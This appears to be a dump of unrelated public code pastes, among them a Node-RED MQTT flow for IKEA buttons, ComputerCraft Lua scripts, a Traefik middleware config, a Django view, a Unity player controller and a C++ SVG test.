        ""tostatus"": false,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": """",
        ""statusType"": ""auto"",
        ""x"": 890,
        ""y"": 1000,
        ""wires"": []
    },
    {
        ""id"": ""54c8c41b.3c689c"",
        ""type"": ""function"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": """",
        ""func"": ""var words = msg.topic.split('/');\nvar Knoten = (words[3]);\n\nvar Click = msg.payload.action\nvar duration = msg.payload.duration\nvar qual = msg.payload.linkquality\nvar bat  = msg.payload.battery\n\nmsg.payload = [{\n    Room: Knoten,\n    Click: Click,\n    Duration: duration,\n    Qual: qual,\n    Bat: bat\n}]\n\nnode.status({fill:\""blue\"",shape:\""ring\"",text:\""Click: \"" + Click + \"", Qual: \"" + qual + \""%\"" + \"", Duration: \"" + duration + \""sec\"" });\n// node.status({fill:\""blue\"",shape:\""ring\"",text:\""Click: \"" + Click + \"", Qual: \"" + qual + \""%\"" });\nreturn msg;"",
        ""outputs"": 1,
        ""noerr"": 0,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 570,
        ""y"": 1000,
        ""wires"": [
            [
                ""c9757d4f.fc9b7""
            ]
        ]
    },
    {
        ""id"": ""6b87e3c0.694bfc"",
        ""type"": ""switch"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow Right"",
        ""property"": ""payload.action"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""arrow_right_click"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""arrow_right_hold"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""arrow_right_release"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 3,
        ""x"": 690,
        ""y"": 100,
        ""wires"": [
            [
                ""15f262c.aba469d""
            ],
            [
                ""c25b2666.b77318""
            ],
            [
                ""e2e8c6e3.564d48""
            ]
        ]
    },
    {
        ""id"": ""15f262c.aba469d"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Right_Click"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 890,
        ""y"": 40,
        ""wires"": []
    },
    {
        ""id"": ""c25b2666.b77318"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Right_Hold"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 890,
        ""y"": 100,
        ""wires"": []
    },
    {
        ""id"": ""e2e8c6e3.564d48"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Right_Release"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 900,
        ""y"": 160,
        ""wires"": []
    },
    {
        ""id"": ""35c2421d.27180e"",
        ""type"": ""switch"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow Left"",
        ""property"": ""payload.action"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""arrow_left_click"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""arrow_left_hold"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""arrow_left_release"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 3,
        ""x"": 690,
        ""y"": 300,
        ""wires"": [
            [
                ""aff91674.8c7458""
            ],
            [
                ""5bc7b784.9d95f8""
            ],
            [
                ""8aad4afd.9c74b8""
            ]
        ]
    },
    {
        ""id"": ""aff91674.8c7458"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Left_Click"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 890,
        ""y"": 240,
        ""wires"": []
    },
    {
        ""id"": ""5bc7b784.9d95f8"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Left_Hold"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 890,
        ""y"": 300,
        ""wires"": []
    },
    {
        ""id"": ""8aad4afd.9c74b8"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Arrow_Left_Release"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 900,
        ""y"": 360,
        ""wires"": []
    },
    {
        ""id"": ""ca674756.f8bbc8"",
        ""type"": ""switch"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness Up"",
        ""property"": ""payload.action"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""brightness_up_click"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""brightness_up_hold"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""brightness_up_release"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 3,
        ""x"": 680,
        ""y"": 500,
        ""wires"": [
            [
                ""ab95a88.7281858""
            ],
            [
                ""15c41dfd.ec9cd2""
            ],
            [
                ""1f202961.d4bc77""
            ]
        ]
    },
    {
        ""id"": ""dd05e125.7ba94"",
        ""type"": ""switch"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness Down"",
        ""property"": ""payload.action"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""brightness_down_click"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""brightness_down_hold"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""brightness_down_release"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 3,
        ""x"": 670,
        ""y"": 700,
        ""wires"": [
            [
                ""318f1334.a1295c""
            ],
            [
                ""d3b6ba7e.a4c588""
            ],
            [
                ""cd4b345f.188d38""
            ]
        ]
    },
    {
        ""id"": ""318f1334.a1295c"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Down_Click"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 910,
        ""y"": 640,
        ""wires"": []
    },
    {
        ""id"": ""d3b6ba7e.a4c588"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Down_Hold"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 910,
        ""y"": 700,
        ""wires"": []
    },
    {
        ""id"": ""cd4b345f.188d38"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Down_Release"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 920,
        ""y"": 760,
        ""wires"": []
    },
    {
        ""id"": ""ab95a88.7281858"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Up_Click"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 900,
        ""y"": 440,
        ""wires"": []
    },
    {
        ""id"": ""15c41dfd.ec9cd2"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Up_Hold"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 900,
        ""y"": 500,
        ""wires"": []
    },
    {
        ""id"": ""1f202961.d4bc77"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Brightness_Up_Release"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 910,
        ""y"": 560,
        ""wires"": []
    },
    {
        ""id"": ""14c8b050.1758f"",
        ""type"": ""switch"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Toggle"",
        ""property"": ""payload.action"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""toggle"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""toggle_hold"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 2,
        ""x"": 710,
        ""y"": 880,
        ""wires"": [
            [
                ""dad0115e.d5eb9"",
                ""1bbb8320c7a4a9e7""
            ],
            [
                ""263283d1.2e596c""
            ]
        ]
    },
    {
        ""id"": ""dad0115e.d5eb9"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Toggle"",
        ""active"": true,
        ""tosidebar"": false,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 850,
        ""y"": 840,
        ""wires"": []
    },
    {
        ""id"": ""263283d1.2e596c"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Toggle_Hold"",
        ""active"": false,
        ""tosidebar"": true,
        ""console"": false,
        ""tostatus"": true,
        ""complete"": ""payload"",
        ""targetType"": ""msg"",
        ""statusVal"": ""payload"",
        ""statusType"": ""auto"",
        ""x"": 870,
        ""y"": 900,
        ""wires"": []
    },
    {
        ""id"": ""77a8cceaa300de7d"",
        ""type"": ""mqtt in"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""IKEA Button-1"",
        ""topic"": ""/home/zigbee/IKEA-Button-1"",
        ""qos"": ""2"",
        ""datatype"": ""json"",
        ""broker"": ""595dfa51.2c1224"",
        ""nl"": false,
        ""rap"": false,
        ""inputs"": 0,
        ""x"": 110,
        ""y"": 300,
        ""wires"": [
            [
                ""827685862394cc86""
            ]
        ]
    },
    {
        ""id"": ""13efeab63f28384d"",
        ""type"": ""mqtt in"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""IKEA Button-2"",
        ""topic"": ""/home/zigbee/IKEA-Button-2"",
        ""qos"": ""2"",
        ""datatype"": ""json"",
        ""broker"": ""595dfa51.2c1224"",
        ""nl"": false,
        ""rap"": false,
        ""inputs"": 0,
        ""x"": 110,
        ""y"": 360,
        ""wires"": [
            [
                ""827685862394cc86""
            ]
        ]
    },
    {
        ""id"": ""1214c510b0c6a90f"",
        ""type"": ""mqtt in"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""IKEA Button-3"",
        ""topic"": ""/home/zigbee/IKEA-Button-3"",
        ""qos"": ""2"",
        ""datatype"": ""json"",
        ""broker"": ""595dfa51.2c1224"",
        ""nl"": false,
        ""rap"": false,
        ""inputs"": 0,
        ""x"": 110,
        ""y"": 420,
        ""wires"": [
            [
                ""827685862394cc86""
            ]
        ]
    },
    {
        ""id"": ""827685862394cc86"",
        ""type"": ""function"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": """",
        ""func"": ""var words = msg.topic.split('/');\nvar KnotenName = (words[3]);\n\nreturn msg;"",
        ""outputs"": 1,
        ""noerr"": 0,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 420,
        ""y"": 300,
        ""wires"": [
            [
                ""6b87e3c0.694bfc"",
                ""35c2421d.27180e"",
                ""ca674756.f8bbc8"",
                ""dd05e125.7ba94"",
                ""54c8c41b.3c689c"",
                ""14c8b050.1758f""
            ]
        ]
    },
    {
        ""id"": ""1bbb8320c7a4a9e7"",
        ""type"": ""link out"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""IKEA-Button-Toggle-OUT"",
        ""mode"": ""link"",
        ""links"": [
            ""af8ae2683011ff9a""
        ],
        ""x"": 815,
        ""y"": 800,
        ""wires"": []
    },
    {
        ""id"": ""595dfa51.2c1224"",
        ""type"": ""mqtt-broker"",
        ""name"": ""Kossdorf"",
        ""broker"": ""192.168.123.16"",
        ""port"": ""1883"",
        ""clientid"": """",
        ""autoConnect"": true,
        ""usetls"": false,
        ""protocolVersion"": ""4"",
        ""keepalive"": ""60"",
        ""cleansession"": true,
        ""birthTopic"": """",
        ""birthQos"": ""0"",
        ""birthPayload"": """",
        ""birthMsg"": {},
        ""closeTopic"": """",
        ""closePayload"": """",
        ""closeMsg"": {},
        ""willTopic"": """",
        ""willQos"": ""0"",
        ""willPayload"": """",
        ""willMsg"": {},
        ""userProps"": """",
        ""sessionExpiry"": """"
    }
]"
1RqzcvBq,auto_build_wither_boss,mickael49300_fr,Lua,Friday 2nd of June 2023 02:03:15 PM CDT,"print("" auto build wither boss "")
print("" programme V.1.5 "")
print("" by Mickael49300_fr "")
print("" en attente de ressource "")
while true do
sleep(.1)

  while rs.getInput(""back"") do -- attente du signal de redstone pour lancer le programe
-- chargement des block
print("" chargement des block "")
turtle.turnLeft()
turtle.select(1) -- prend 3 tête
turtle.suck(3)
turtle.turnLeft()
turtle.turnLeft()
turtle.select(2) -- prend 4 soul sand
turtle.suck(4)
turtle.turnLeft()
-- deplacement et construction du wither boss 
print("" construction du wither boss  "")
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.turnLeft()
turtle.down()
turtle.placeDown()
turtle.forward()
turtle.down()
turtle.placeDown()
turtle.up()
turtle.placeDown()
turtle.forward()
turtle.placeDown()
turtle.up()
turtle.turnLeft()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.turnLeft()
turtle.select(1) -- tête 
turtle.placeDown()
turtle.forward()
turtle.placeDown()
turtle.forward()
turtle.placeDown()
-- retour point de départ puis refuel 
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.suckDown(1)
turtle.refuel(1)
turtle.turnLeft()
turtle.turnLeft()
sleep(10)
print(""en attente de ressource"")
   
  end
end"
3DzQUrMJ,middlewares.yml,moltra,YAML,Friday 2nd of June 2023 01:57:24 PM CDT,"http:
  middlewares:
    middlewares-basic-auth:
      basicAuth:
        users:
			deleted user info
        usersFile: ""/shared/.htpasswd"" # be sure to mount the volume through docker-compose.yml
        realm: ""Traefik 2 Basic Auth""

    middlewares-rate-limit:
      rateLimit:
        average: 100
        burst: 50

    middlewares-https-redirectscheme:
      redirectScheme:
        scheme: https
        permanent: true

    middlewares-secure-headers:
      headers:
        accessControlAllowMethods:
          - GET
          - OPTIONS
          - PUT
        accessControlMaxAge: 100
        hostsProxyHeaders:
          - ""X-Forwarded-Host""
        stsSeconds: 63072000
        stsIncludeSubdomains: true
        stsPreload: true
        forceSTSHeader: true
        customFrameOptionsValue: SAMEORIGIN # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
        contentTypeNosniff: true
        browserXssFilter: true
        referrerPolicy: ""same-origin""
        permissionsPolicy: ""camera=(), microphone=(), geolocation=(), payment=(), usb=(), vr=()""
        customResponseHeaders:
          X-Robots-Tag: ""none,noarchive,nosnippet,notranslate,noimageindex,"" # disable search engines from indexing home server
          server: """" # hide server info from visitors

    # middlewares-oauth:
    #   forwardAuth:
    #     address: ""http://oauth:4181"" # Make sure you have the OAuth service in docker-compose.yml
    #     trustForwardHeader: true
    #     authResponseHeaders:
    #       - ""X-Forwarded-User""

    # middlewares-oauth-external:
    #   forwardAuth:
    #     address: ""https://oauth.{{env ""DOMAINNAME_CLOUD_SERVER""}}"" # Make sure you have the OAuth service in a remote server
    #     trustForwardHeader: true
    #     authResponseHeaders:
    #       - ""X-Forwarded-User""

    # middlewares-authelia:
    #   forwardAuth:
    #     address: ""http://authelia:9091/api/verify?rd=https://authelia.{{env ""DOMAINNAME_CLOUD_SERVER""}}""
    #     trustForwardHeader: true
    #     authResponseHeaders:
    #       - ""Remote-User""
    #       - ""Remote-Groups""

    middlewares-compress:
      compress: {}
    
    # https://stackoverflow.com/questions/49717670/how-to-config-upload-body-size-restriction-in-traefik
    middlewares-buffering:
      buffering:
        maxResponseBodyBytes: 2000000
        maxRequestBodyBytes: 10485760  
        memRequestBodyBytes: 2097152  
        memResponseBodyBytes: 2097152
        retryExpression: ""IsNetworkError() && Attempts() <= 2"""
FfLSSktT,Untitled,KNenov96,Python,Friday 2nd of June 2023 01:11:55 PM CDT,"class ProfileDeleteView(DeleteView):
    model = UserProfile
    template_name = 'delete-profile.html'
    success_url = reverse_lazy('home-page')

    def get_object(self, queryset=None):
        return self.request.user

    def get(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = EditUserForm(instance=self.request.user.userprofile)
        for field in form.fields.values():
            field.widget.attrs['disabled'] = 'disabled'
        return self.render_to_response(self.get_context_data(form=form))"
sQ8TubZp,Untitled,ewalkowka,C#,Friday 2nd of June 2023 12:52:15 PM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class PlayerController : MonoBehaviour
{
    public float jumpForce = 5f;
    public float speed = 5f;
    public float groundedDistance = 5f;

    private Rigidbody2D rb = null;

    private float timeSinceLastJump;

    void Start()
    {
        rb = GetComponent<Rigidbody2D>();
        timeSinceLastJump = 0.5f; 
    }

    void Update()
    {
        timeSinceLastJump += Time.deltaTime;

        bool grounded = false;

        if(Physics2D.Raycast(transform.position, Vector2.down, groundedDistance, LayerMask.GetMask(""Ground"")))
        {
            grounded = true;
            Debug.Log( ""uziemiony"" );
        }

        if(Input.GetKeyDown(KeyCode.Space) && timeSinceLastJump > 0.5f
            && grounded)
        {
            timeSinceLastJump = 0f;
            rb.AddForce( new Vector2( 0f, jumpForce ) );
        }

        float moveX = Input.GetAxis( ""Horizontal"" );
        rb.velocity = new Vector2( moveX * speed, rb.velocity.y );
    }
}
"
stdzHgms,ArrowDropDispRemote,Phemto,Lua,Friday 2nd of June 2023 12:52:09 PM CDT,"--Wait for a redstone signal and then activate the drop protocol
local channel = 43  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
	end
end 


		"
ez9SSams,DocumentTest,cepxuozab,C++,Friday 2nd of June 2023 12:46:47 PM CDT,"#define _USE_MATH_DEFINES
#include ""svg.h""

#include <cmath>
#include <iostream>
using namespace std::literals;
using namespace svg;
using namespace std;
  // namespace

void DocumentTest() {
        {
            Document doc;
            doc.Render(cout);
            cout << ""endl"";
        } {
            Document doc;
            doc.Add(Circle().SetCenter({20, 20}).SetRadius(10));
            doc.Render(cout);
            cout << ""endl"";
        } {
            Document doc;
            doc.Add(Circle().SetCenter({20, 20}).SetRadius(10));
            doc.Add(Text()
                            .SetFontFamily(""Verdana""s)
                            .SetPosition({35, 20})
                            .SetOffset({0, 6})
                            .SetFontSize(12)
                            .SetFontWeight(""bold""s)
                            .SetData(""Hello C++""s));
            doc.Add(Polyline().AddPoint({20, 20}).AddPoint({10, 15}).AddPoint({0, 10}));
            doc.Render(cout);
            cout << ""endl"";
        } {
            Document doc;
            doc.AddPtr(make_unique<Circle>(move(
                    Circle().SetCenter({20, 20}).SetRadius(10))));
            doc.AddPtr(make_unique<Text>(move(
                        Text()
                        .SetFontFamily(""Verdana""s)
                        .SetPosition({35, 20})
                        .SetOffset({0, 6})
                        .SetFontSize(12)
                        .SetFontWeight(""bold""s)
                        .SetData(""Hello C++""s))));
            doc.AddPtr(make_unique<Polyline>(move(
                    Polyline().AddPoint({20, 20}).AddPoint({10, 15}).AddPoint({0, 10}))));
            doc.Render(cout);
        }
    }
int main() {
    DocumentTest();
}


<?xml version=""1.0"" encoding=""UTF-8"" ?>
<svg xmlns=""http://www.w3.org/2000/svg"" version=""1.1"">
</svg>endl<?xml version=""1.0"" encoding=""UTF-8"" ?>
<svg xmlns=""http://www.w3.org/2000/svg"" version=""1.1"">
  <circle cx=""20"" cy=""20"" r=""10"" />
</svg>endl<?xml version=""1.0"" encoding=""UTF-8"" ?>
<svg xmlns=""http://www.w3.org/2000/svg"" version=""1.1"">
  <circle cx=""20"" cy=""20"" r=""10"" />
  <text x=""35"" y=""20"" dx=""0"" dy=""6"" font-size=""12"" font-family=""Verdana"" font-weight=""bold"">Hello C++</text>
  <polyline points=""20,20 10,15 0,10"" />
</svg>endl<?xml version=""1.0"" encoding=""UTF-8"" ?>
<svg xmlns=""http://www.w3.org/2000/svg"" version=""1.1"">
  <circle cx=""20"" cy=""20"" r=""10"" />
  <text x=""35"" y=""20"" dx=""0"" dy=""6"" font-size=""12"" font-family=""Verdana"" font-weight=""bold"">Hello C++</text>
  <polyline points=""20,20 10,15 0,10"" />
</svg>"
P82aWy87,SandDropRemote,Phemto,Lua,Friday 2nd of June 2023 12:40:24 PM CDT,"--Wait for a redstone signal and then activate the drop protocol for SandDrop
local channel = 44  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

turtle.select(1)
turtle.back()
for i=1,10,1 do
	turtle.digDown()
	turtle.down()
end
for i=1,10,1 do 
	turtle.up()
end
turtle.dig()
turtle.forward()
turtle.turnRight()
turtle.turnRight()
turtle.place()
while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
		sleep(3)
		turtle.dig()
	end
end 


		"
V7wGH3a4,Coconut song,Tbonetomtom,Lua,Friday 2nd of June 2023 12:36:27 PM CDT,"function makeSong()
	temp = {}
	temp[""tps""] = 16
	temp[""title""] = ""Coconut Song""
	temp[1] = {{6, 18}, {6, 22}, {6, 13}, {6, -6}, }
	temp[2] = {}
	temp[3] = {}
	temp[4] = {}
	temp[5] = {{6, 18}, {6, 22}, {6, 13}, {6, 6}, }
	temp[6] = {}
	temp[7] = {}
	temp[8] = {}
	temp[9] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[10] = {}
	temp[11] = {}
	temp[12] = {}
	temp[13] = {{6, -2}, }
	temp[14] = {}
	temp[15] = {}
	temp[16] = {}
	temp[17] = {{6, 6}, {6, 10}, {6, 13}, }
	temp[18] = {}
	temp[19] = {}
	temp[20] = {}
	temp[21] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[22] = {}
	temp[23] = {}
	temp[24] = {}
	temp[25] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[26] = {}
	temp[27] = {}
	temp[28] = {}
	temp[29] = {{6, 11}, {6, 15}, {6, 6}, {6, -1}, }
	temp[30] = {}
	temp[31] = {}
	temp[32] = {}
	temp[33] = {}
	temp[34] = {}
	temp[35] = {}
	temp[36] = {}
	temp[37] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[38] = {}
	temp[39] = {}
	temp[40] = {}
	temp[41] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[42] = {}
	temp[43] = {}
	temp[44] = {}
	temp[45] = {{6, 3}, {6, 6}, {6, 11}, {6, -4}, }
	temp[46] = {}
	temp[47] = {}
	temp[48] = {}
	temp[49] = {{6, 5}, {6, 8}, {6, 13}, {6, 1}, }
	temp[50] = {}
	temp[51] = {}
	temp[52] = {}
	temp[53] = {{6, 5}, {6, 8}, {6, 13}, }
	temp[54] = {}
	temp[55] = {}
	temp[56] = {}
	temp[57] = {{6, 3}, {6, 6}, {6, 11}, {6, -11}, }
	temp[58] = {}
	temp[59] = {}
	temp[60] = {}
	temp[61] = {}
	temp[62] = {}
	temp[63] = {}
	temp[64] = {}
	temp[65] = {{6, 18}, {6, 22}, {6, 13}, {6, -6}, }
	temp[66] = {}
	temp[67] = {}
	temp[68] = {}
	temp[69] = {{6, 18}, {6, 22}, {6, 13}, {6, 6}, }
	temp[70] = {}
	temp[71] = {}
	temp[72] = {}
	temp[73] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[74] = {}
	temp[75] = {}
	temp[76] = {}
	temp[77] = {{6, -2}, }
	temp[78] = {}
	temp[79] = {}
	temp[80] = {}
	temp[81] = {{6, 6}, {6, 10}, {6, 13}, }
	temp[82] = {}
	temp[83] = {}
	temp[84] = {}
	temp[85] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[86] = {}
	temp[87] = {}
	temp[88] = {}
	temp[89] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[90] = {}
	temp[91] = {}
	temp[92] = {}
	temp[93] = {{6, 11}, {6, 15}, {6, 6}, {6, -1}, }
	temp[94] = {}
	temp[95] = {}
	temp[96] = {}
	temp[97] = {}
	temp[98] = {}
	temp[99] = {}
	temp[100] = {}
	temp[101] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[102] = {}
	temp[103] = {}
	temp[104] = {}
	temp[105] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[106] = {}
	temp[107] = {}
	temp[108] = {}
	temp[109] = {{6, 3}, {6, 6}, {6, 11}, {6, -4}, }
	temp[110] = {}
	temp[111] = {}
	temp[112] = {}
	temp[113] = {{6, 5}, {6, 8}, {6, 13}, {6, 1}, }
	temp[114] = {}
	temp[115] = {}
	temp[116] = {}
	temp[117] = {{6, 6}, {6, 11}, {6, 15}, {6, 1}, }
	temp[118] = {}
	temp[119] = {}
	temp[120] = {}
	temp[121] = {{6, 8}, {6, 13}, {6, 17}, {6, -11}, }
	temp[122] = {}
	temp[123] = {}
	temp[124] = {}
	temp[125] = {}
	temp[126] = {}
	temp[127] = {}
	temp[128] = {}
	temp[129] = {{6, 18}, {6, 22}, {6, 13}, {6, -6}, }
	temp[130] = {}
	temp[131] = {}
	temp[132] = {}
	temp[133] = {{6, 18}, {6, 22}, {6, 13}, {6, 6}, }
	temp[134] = {}
	temp[135] = {}
	temp[136] = {}
	temp[137] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[138] = {}
	temp[139] = {}
	temp[140] = {}
	temp[141] = {{6, -2}, }
	temp[142] = {}
	temp[143] = {}
	temp[144] = {}
	temp[145] = {{6, 6}, {6, 10}, {6, 13}, }
	temp[146] = {}
	temp[147] = {}
	temp[148] = {}
	temp[149] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[150] = {}
	temp[151] = {}
	temp[152] = {}
	temp[153] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[154] = {}
	temp[155] = {}
	temp[156] = {}
	temp[157] = {{6, 11}, {6, 15}, {6, 6}, {6, -1}, }
	temp[158] = {}
	temp[159] = {}
	temp[160] = {}
	temp[161] = {}
	temp[162] = {}
	temp[163] = {}
	temp[164] = {}
	temp[165] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[166] = {}
	temp[167] = {}
	temp[168] = {}
	temp[169] = {{6, 6}, {6, 11}, {6, 15}, }
	temp[170] = {}
	temp[171] = {}
	temp[172] = {}
	temp[173] = {{6, 3}, {6, 6}, {6, 11}, {6, -4}, }
	temp[174] = {}
	temp[175] = {}
	temp[176] = {}
	temp[177] = {{6, 5}, {6, 8}, {6, 13}, {6, 1}, }
	temp[178] = {}
	temp[179] = {}
	temp[180] = {}
	temp[181] = {{6, 5}, {6, 8}, {6, 13}, }
	temp[182] = {}
	temp[183] = {}
	temp[184] = {}
	temp[185] = {{6, 3}, {6, 6}, {6, 11}, {6, -11}, }
	temp[186] = {}
	temp[187] = {}
	temp[188] = {}
	temp[189] = {}
	temp[190] = {}
	temp[191] = {}
	temp[192] = {}
	temp[193] = {{6, 18}, {6, 22}, {6, 13}, {6, -6}, }
	temp[194] = {}
	temp[195] = {}
	temp[196] = {}
	temp[197] = {{6, 18}, {6, 22}, {6, 13}, {6, 6}, }
	temp[198] = {}
	temp[199] = {}
	temp[200] = {}
	temp[201] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[202] = {}
	temp[203] = {}
	temp[204] = {}
	temp[205] = {{6, -2}, }
	temp[206] = {}
	temp[207] = {}
	temp[208] = {}
	temp[209] = {{6, 6}, {6, 10}, {6, 13}, }
	temp[210] = {}
	temp[211] = {}
	temp[212] = {}
